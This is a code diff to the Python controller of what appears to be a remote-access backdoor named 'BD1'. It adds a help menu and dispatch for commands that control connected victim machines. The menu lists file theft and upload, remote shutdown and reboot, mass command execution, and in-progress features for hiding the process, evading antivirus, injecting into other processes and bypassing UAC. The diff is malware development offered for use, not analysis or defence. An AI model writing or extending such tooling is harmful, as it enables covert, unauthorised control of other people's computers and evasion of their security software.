@@ -224,6 +224,42 @@ class Allclients:
             return response
         except Exception as e:
             return f"[-] Command execution has error: {str(e)}"
+        
+
+    def show_help(self):
+        help_text = """
+Available Commands:
+  General:
+    help                     - Show this help message (OK)
+    list                     - List all connected clients (OK)
+    select <client_id>       - Select a client to control (OK)
+    exit                     - Exit the server (OK)
+
+  File Operations:
+    download <file>         - Download file from client (OK but had few bug)
+    upload <file>           - Upload file to client (OK but had few bug)
+
+  System Control:
+    allclients            - Send command all clients (OK)
+    shutdown              - Shutdown client machine (OK)
+    reboot                - Reboot client machine (OK)
+    sysinfo               - Get system information (In Processing)
+    cd <path>             - Change working directory (OK)
+
+  Evade & Hide:
+    runas <program> [args] - Run program as administrator (In processing)
+    hide                   - Hide BD1 process (In processing)
+    evade                  - Apply antivirus evasion techniques (In processing)
+    inject [pid]          - Inject into another process (In processing)
+
+  UAC Commands:
+    bypassuac            - Bypass UAC for current process (In processing)
+    bypassuac <command>  - Bypass UAC and run specific command (In processing)
+
+"""
+        print(help_text)
+
+
 
     def run_cmd(self):
         accept_thread = threading.Thread(target=self.accept_connections)
@@ -238,7 +274,10 @@ class Allclients:
                 cmd_parts = cmd.split()
                 base_cmd = cmd_parts[0].lower()
 
-                if base_cmd == "list":
+                if base_cmd == "help":
+                    self.show_help()
+
+                elif base_cmd == "list":
                     self.list_clients()
 
                 elif base_cmd == "select":
